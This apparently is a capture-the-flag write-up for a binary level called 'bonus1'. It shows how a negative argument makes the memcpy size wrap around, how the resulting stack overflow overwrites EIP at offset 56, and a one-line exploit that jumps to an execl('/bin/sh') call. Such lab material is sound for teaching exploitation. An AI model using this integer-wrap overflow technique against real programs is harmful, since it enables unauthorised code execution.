binary takes two arguments

atoi(av[1]) then checks if lower than 9

if yes
tries to memcpy length of 4*atoi(av[1]) from av[2] into another string, we can overflow here

then compares atoi(av[1]) to 0x574f4c46 (1464814662 in dec)
if equal runs execl "/bin/sh"

doesn't look like we can overflow with memcpy_size of 4*9 = 36

but it the second comparison tells us we can get bigger memcpy_size somehow

let's try overflowing on 4 * atoi(av[1])

memcpy uses unsigned int

MIN_UINT = 0
MAX_UINT = 4294967295

4294967295 / 4 = 1073741823

gdb bonus0
r -1073741823 aaabbb[...]qqqq
-> memcpy_size of 4

so to get a size of 100 as an example we'd need to have -(1073741824 - (100 / 4)) = -1073741799
r -1073741799 aaabbb[...]qqqq

we overflow
ebp = 0x6e6e6e6e
eip = 0x6f6f6f6f

offset is 56 for the eip

we can simply put the address of the execl call and enter shell

./bonus1 -1073741799 `python -c 'print("a" * 56 + "\x82\x84\x04\x08")'`
